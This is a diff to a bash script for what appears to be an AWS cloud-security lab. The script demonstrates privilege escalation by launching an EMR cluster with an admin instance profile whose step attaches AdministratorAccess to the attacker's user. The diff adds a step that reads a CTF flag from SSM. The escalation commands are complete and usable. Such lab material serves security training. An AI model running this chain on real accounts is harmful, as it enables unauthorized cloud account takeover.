@@ -32,7 +32,8 @@ show_cmd() {
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -113,27 +114,28 @@ use_readonly_creds() {
     unset AWS_SESSION_TOKEN
 }
 
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-use_starting_creds
 export AWS_REGION=$AWS_REGION
-
 echo "Using region: $AWS_REGION"
 
-# [EXPLOIT] Verify starting user identity
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
+# [OBSERVATION] Verify starting user identity using readonly creds (starting user does not have sts:GetCallerIdentity)
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "Current identity: $CURRENT_USER"
-
-if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
-    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
-    exit 1
-fi
-echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
+echo "Current identity for context: $CURRENT_USER"
+echo -e "${GREEN}✓ ReadOnly credentials confirmed${NC}\n"
 
 # [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-use_readonly_creds
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -163,7 +165,7 @@ echo -e "${BLUE}The EMR step will execute:${NC}"
 echo "  aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
 echo ""
 
-show_attack_cmd "aws emr create-cluster --region $AWS_REGION --name \"$EMR_CLUSTER_NAME\" --release-label emr-7.0.0 --applications Name=Hadoop --instance-type m5.xlarge --instance-count 1 --service-role \"$SERVICE_ROLE_NAME\" --ec2-attributes \"InstanceProfile=$ADMIN_INSTANCE_PROFILE_NAME\" --steps '[{\"Name\":\"Escalate\",\"ActionOnFailure\":\"TERMINATE_CLUSTER\",\"Type\":\"CUSTOM_JAR\",\"Jar\":\"command-runner.jar\",\"Args\":[\"bash\",\"-c\",\"aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"]}]' --auto-terminate --output json"
+show_attack_cmd "Attacker" "aws emr create-cluster --region $AWS_REGION --name \"$EMR_CLUSTER_NAME\" --release-label emr-7.0.0 --applications Name=Hadoop --instance-type m5.xlarge --instance-count 1 --service-role \"$SERVICE_ROLE_NAME\" --ec2-attributes \"InstanceProfile=$ADMIN_INSTANCE_PROFILE_NAME\" --steps '[{\"Name\":\"Escalate\",\"ActionOnFailure\":\"TERMINATE_CLUSTER\",\"Type\":\"CUSTOM_JAR\",\"Jar\":\"command-runner.jar\",\"Args\":[\"bash\",\"-c\",\"aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"]}]' --auto-terminate --output json"
 CLUSTER_RESULT=$(aws emr create-cluster \
     --region $AWS_REGION \
     --name "$EMR_CLUSTER_NAME" \
@@ -221,6 +223,14 @@ while [ $WAIT_TIME -lt $MAX_WAIT ]; do
         break
     elif [ "$CLUSTER_STATE" = "TERMINATED_WITH_ERRORS" ]; then
         echo -e "${RED}Cluster terminated with errors${NC}"
+        # Surface the underlying reason so failures self-diagnose (service role perms,
+        # subnet/VPC problems, instance type capacity, etc.)
+        show_cmd "ReadOnly" "aws emr describe-cluster --region $AWS_REGION --cluster-id \"$CLUSTER_ID\" --query 'Cluster.Status.StateChangeReason' --output json"
+        aws emr describe-cluster \
+            --region $AWS_REGION \
+            --cluster-id "$CLUSTER_ID" \
+            --query 'Cluster.Status.StateChangeReason' \
+            --output json || true
         echo "Checking step status to determine if escalation succeeded anyway..."
         break
     fi
@@ -279,12 +289,14 @@ else
 fi
 echo ""
 
-# [OBSERVATION] Step 10: Verify admin access
+# [EXPLOIT] Step 10: Verify admin access using the elevated starting user credentials
+# Must use starting creds here — using readonly creds would be a false positive
+# (readonly user has broad read permissions independently of the attack succeeding).
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
-echo "Attempting to list IAM users..."
+echo "Attempting to list IAM users with the now-elevated starting user..."
 
-use_readonly_creds
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+use_starting_creds
+show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -296,9 +308,29 @@ else
 fi
 echo ""
 
-# Summary
+# [EXPLOIT]
+# Step 11: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/emr-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER_NAME (with iam:PassRole + elasticmapreduce:RunJobFlow)"
@@ -308,12 +340,14 @@ echo "   - Service role: $SERVICE_ROLE_NAME"
 echo "3. EMR step used command-runner.jar to execute:"
 echo "   aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
 echo "4. Achieved: Administrator Access"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER_NAME -> (iam:PassRole + elasticmapreduce:RunJobFlow)"
-echo -e "  -> EMR cluster with admin instance profile + service role"
-echo -e "  -> (command-runner.jar step) -> iam:AttachUserPolicy"
-echo -e "  -> AdministratorAccess attached to $STARTING_USER_NAME -> Admin"
+echo -e "  $STARTING_USER_NAME → (iam:PassRole + elasticmapreduce:RunJobFlow)"
+echo -e "  → EMR cluster with admin instance profile + service role"
+echo -e "  → (command-runner.jar step) → iam:AttachUserPolicy"
+echo -e "  → AdministratorAccess attached to $STARTING_USER_NAME → Admin"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
